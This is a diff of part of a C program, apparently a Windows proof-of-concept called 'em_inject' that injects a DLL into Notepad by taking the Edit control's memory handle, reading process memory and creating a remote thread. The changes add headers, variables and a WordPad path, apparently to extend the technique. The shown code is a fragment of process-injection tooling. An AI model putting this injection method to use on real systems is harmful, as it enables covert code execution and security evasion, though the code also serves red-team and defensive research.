@@ -35,6 +35,7 @@
 #include <inttypes.h>
 
 #include <windows.h>
+#include <tlhelp32.h>
 #pragma comment(lib, "user32.lib")
 
 // default is 1 second
@@ -329,12 +330,14 @@ exit_copy:
     CloseClipboard();
     return bResult;
 }
+// EM_SETAUTOCORRECTPROC 
 BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
     char cls[MAX_PATH];
     HWND hw=NULL, *out = (HWND*)lParam;
     
     GetClassName(hwnd, cls, MAX_PATH);
     
+    // Rich edit controls do not store text as a simple array of characters.
     if(!lstrcmp(cls, "Notepad")) {
       hw = FindWindowEx(hwnd, NULL, "Edit", NULL);
       if(hw != NULL) {
@@ -345,6 +348,8 @@ BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
+#define WORDPAD "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe"
+
 int main(int argc, char *argv[]) {
     int                   c, i, dll_len, asc_len, cs_len;
     uint8_t               *emh, *cs, *asc, buf[4096];
@@ -352,13 +357,15 @@ int main(int argc, char *argv[]) {
     SIZE_T                rd;
     HWND                  hw=NULL, pw;
     CLIENT_ID             cid;
-    HANDLE                ht;
+    HANDLE                ss, ht;
     RtlCreateUserThread_t rtlcreate;
-    w64_t                 embuf, lastbuf;
+    w64_t                 embuf, lastbuf, wrap;
     HMODULE               m;
     PCHAR                 dll_path;
     STARTUPINFO           si;
     PROCESS_INFORMATION   pi;
+    THREADENTRY32         te;
+    INPUT                 ip;
     
     if(argc != 2) {
       printf("usage: em_inject <full path of DLL to inject>\n");
@@ -382,14 +389,20 @@ int main(int argc, char *argv[]) {
       printf("unable to obtain the window handle.\n");
       goto cleanup;
     }
-    printf("\nWindow Handle     : %p", (PVOID)hw);
+    printf("\nWindow Handle     : %p\n", (PVOID)hw);
+    
+    emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0); 
+    if(emh == NULL) {
+      printf("Window has no EM handle.\n");
+      goto cleanup;
+    }
     
     // loop until buffer is stable
     cs = lastbuf.p = NULL;
     
     for(;;) {
       // read the memory handle and buffer
-      emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0);
+      emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0);        
       ReadProcessMemory(pi.hProcess, emh, &embuf.p, sizeof(ULONG_PTR), &rd);
       
       // if this is the same as the last one, end the loop
